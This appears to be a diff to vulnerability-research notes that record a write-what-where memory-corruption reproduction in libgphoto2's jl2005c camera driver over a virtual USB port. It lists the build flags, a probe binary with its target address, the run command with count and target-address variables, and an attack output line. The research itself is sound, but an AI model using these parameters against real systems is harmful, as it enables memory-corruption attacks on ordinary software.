@@ -1,7 +1,7 @@
 # W190 (2026-11-25 11:1xZ) — compiler-dependent device-only write-what-where on a FULL clang 2.5.34 build
 # Source: clean tarball sha 5df9e774...f28 + committed live/vusb-jl2005.patch + evidence/replay-vusb-local-modes.patch.
 # Build: out-of-tree configure CC=clang CFLAGS="-O0 -g -fPIC -fno-omit-frame-pointer", --with-camlibs=jl2005c --enable-vusb, make -j4 && make install.
-# Probe: evidence/replay-clang-wwhere-probe.c, clang -O0 -g -no-pie (global sink at 0x4040b0).
+# Probe: evidence/replay-clang-wwhere-probe.c, clang -O0 -g -no-pie (global sink printed by the probe; 0x4040c0 in this binary).
 # Run: env CAMLIBS=$P/lib/libgphoto2/2.5.34 IOLIBS=$P/lib/libgphoto2_port/0.12.2 IOLIBS_PREFIX=vusb LD_LIBRARY_PATH=$P/lib M2SHELL_JL2005_VUSB=p M2SHELL_JL2005_COUNT=<n> M2SHELL_JL2005_TOP=<addr> /tmp/w190-wwhere
 
 === ATTACK count=1022 DEV_TOP=0x4040f0 ===
